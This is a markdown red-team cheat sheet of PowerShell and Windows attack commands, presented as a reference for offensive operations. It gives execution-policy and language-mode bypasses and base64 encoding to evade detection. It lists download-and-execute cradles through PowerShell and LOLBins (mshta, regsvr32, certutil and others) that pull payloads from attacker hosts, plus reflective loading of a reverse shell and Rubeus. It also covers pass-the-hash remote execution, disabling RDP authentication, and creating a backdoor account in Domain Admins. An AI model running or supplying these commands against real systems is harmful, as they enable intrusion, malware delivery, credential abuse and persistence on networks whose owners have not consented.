---
title: "PowerShell Red Team Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - reference-note
  - powershell
  - windows
  - cheatsheet
  - red-team
---

# PowerShell Red Team Reference

PowerShell commands and techniques for red team operations, including execution policy bypass, download cradles, remoting, and reflective loading.

Related: [[AV-EDR-Evasion-Reference]] | [[Network-Pivoting-Reference]] | [[Windows-Privilege-Escalation-Reference]]

---

## Execution Policy Bypass

```ps1
powershell -EncodedCommand $encodedCommand
powershell -ep bypass ./PowerView.ps1

# Change execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
Set-ExecutionPolicy Bypass -Scope Process
```

---

## Constrained Language Mode (CLM)

```ps1
# Check current mode (FullLanguage or ConstrainedLanguage)
$ExecutionContext.SessionState.LanguageMode

# Bypass: PowerShell v2 does not support CLM
powershell -version 2
```

---

## Encoded Commands

Base64-encode a command to avoid string detection.

Windows:

```ps1
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```

Linux (note: UTF-16LE encoding required for Windows PowerShell):

```ps1
echo 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")' | iconv -t utf-16le | base64 -w 0
```

---

## Download File

```ps1
# Any PowerShell version
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/PowerView.ps1", "C:\Windows\Temp\PowerView.ps1")
wget "http://10.10.10.10/taskkill.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
Import-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $output

# PowerShell 4+
IWR "http://10.10.10.10/binary.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe"
Invoke-WebRequest "http://10.10.10.10/binary.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe"
```

---

## Load PowerShell Scripts (Download Cradles)

```ps1
# Proxy-aware
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex"

# Non-proxy aware
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText
```

---

## Download Execute Methods (LOLBins)

### PowerShell HTTP

```powershell
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"

# Download only
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
Invoke-WebRequest "http://10.10.10.10/binary.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe"
```

### From WebDAV

```powershell
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

### CMD

```powershell
cmd.exe /k < \\webdavserver\folder\batchfile.txt
```

### Cscript / Wscript

```powershell
cscript //E:jscript \\webdavserver\folder\payload.txt
```

### Mshta

```powershell
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
mshta http://webserver/payload.hta
mshta \\webdavserver\folder\payload.hta
```

### Rundll32

```powershell
rundll32 \\webdavserver\folder\payload.dll,entrypoint
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```

### Regasm / Regsvc

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```

### Regsvr32

```powershell
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```

### Odbcconf

```powershell
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```

### Msbuild

```powershell
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```

### Certutil

```powershell
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll

certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

### Bitsadmin

```powershell
bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
```

---

## Load C# Assembly Reflectively

```powershell
# Download and run assembly without arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()

# Download and run Rubeus with arguments (split the args)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# Execute a specific method from an assembly (DLL)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

---

## PowerShell Remoting

### Setup and Credentials

```ps1
# Create credential object
$pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\Username', $pass)

# Enable PSRemoting
Enable-PSRemoting -Force
net start winrm

# Add trusted hosts
Set-Item wsman:\localhost\client\trustedhosts *
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.10.10.10"
```

### Execute Commands Remotely

```powershell
# Single command
Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }
Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1

# Interactive session
Enter-PSSession -computerName DC01
[DC01]: PS>

# Persistent session
$Session = New-PSSession -ComputerName CLIENT1
Invoke-Command -Session $Session -scriptBlock { $test = 1 }
Invoke-Command -Session $Session -scriptBlock { $test }
```

---

## WinRM (Evil-WinRM)

Requirements: Port 5985 (HTTP) or 5986 (HTTPS) open. Default endpoint `/wsman`.

```powershell
evil-winrm -i 10.0.0.20 -u username -H HASH
evil-winrm -i 10.0.0.20 -u username -p password -r domain.local

# Within Evil-WinRM
*Evil-WinRM* PS > Bypass-4MSI
*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
```

---

## Impacket Remote Execution

| Method      | Port Used                             | Admin Required |
|-------------|---------------------------------------|----------------|
| psexec.py   | tcp/445                               | Yes            |
| smbexec.py  | tcp/445                               | No             |
| atexec.py   | tcp/445                               | No             |
| dcomexec.py | tcp/135, tcp/445, tcp/49751 (DCOM)    | No             |
| wmiexec.py  | tcp/135, tcp/445, tcp/50911 (Winmgmt) | Yes            |

```ps1
psexec.py DOMAIN/username:password@10.10.10.10
smbexec.py DOMAIN/username:password@10.10.10.10
atexec.py DOMAIN/username:password@10.10.10.10
dcomexec.py DOMAIN/username:password@10.10.10.10
wmiexec.py DOMAIN/username:password@10.10.10.10
wmiexec.py DOMAIN/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

LocalAccountTokenFilterPolicy for non-RID 500 admin accounts:

```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1
```

---

## RDP

```powershell
# Enable RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable

# Fix CredSSP errors
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Disable NLA
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
```

```powershell
# Connect with rdesktop
rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare

# Connect with xfreerdp
xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768
# Pass the hash (Server 2012 R2 / Win 8.1+, requires freerdp2 packages)
xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d
```

---

## Secure String Operations

### Decode a SecureString to Plaintext

```ps1
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb[SNIP]" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl
```

### Convert to/from SecureString

```ps1
# To SecureString
$original = 'myPassword'
$secureString = ConvertTo-SecureString $original -AsPlainText -Force
$secureStringValue = ConvertFrom-SecureString $secureString

# Back to plaintext
$secureStringBack = $secureStringValue | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureStringBack)
$finalValue = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
```

### Decrypt with AES Key

```ps1
$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)
$secureObject = ConvertTo-SecureString -String "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=" -Key $aesKey
$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
$decrypted
```

---

## Win API via Delegate Functions with Reflection

### Resolve API Addresses

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
```

### Create a Delegate Type

```powershell
function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}
```

---

## Run As Another User

```powershell
runas /netonly /user:DOMAIN\username "cmd.exe"
runas /noprofil /netonly /user:DOMAIN\username cmd.exe
```

---

## WMI Execution

```powershell
wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe"
```

---

## SSH with Kerberos

```ps1
# Connect with Kerberos ticket
cp user.ccache /tmp/krb5cc_1045
ssh -o GSSAPIAuthentication=yes user@domain.local -vv
```

---

## Create User Account

```powershell
net user hacker Hcker_12345678* /add /Y
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add
net localgroup "Backup Operators" hacker /add
net group "Domain Admins" hacker /add /domain

# Prevent password from expiring
net user hacker /Expires:Never
net user username /Passwordchg:No

# Enable domain user
net user hacker /ACTIVE:YES /domain
```

---

## Downloaded Files Locations

```
C:\Users\<username>\AppData\Local\Microsoft\Windows\Temporary Internet Files\
C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\IE\<subdir>
C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV
```

---

## References

- [Windows & Active Directory Exploitation Cheat Sheet - @chvancooten](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)
- [Basic PowerShell for Pentesters - HackTricks](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)
- [Windows oneliners to download remote payload - arno0x0x](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
- [Using credentials to own Windows boxes - Ropnop](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
- [Impacket Exec Commands Cheat Sheet - 13cubed](https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet.pdf)
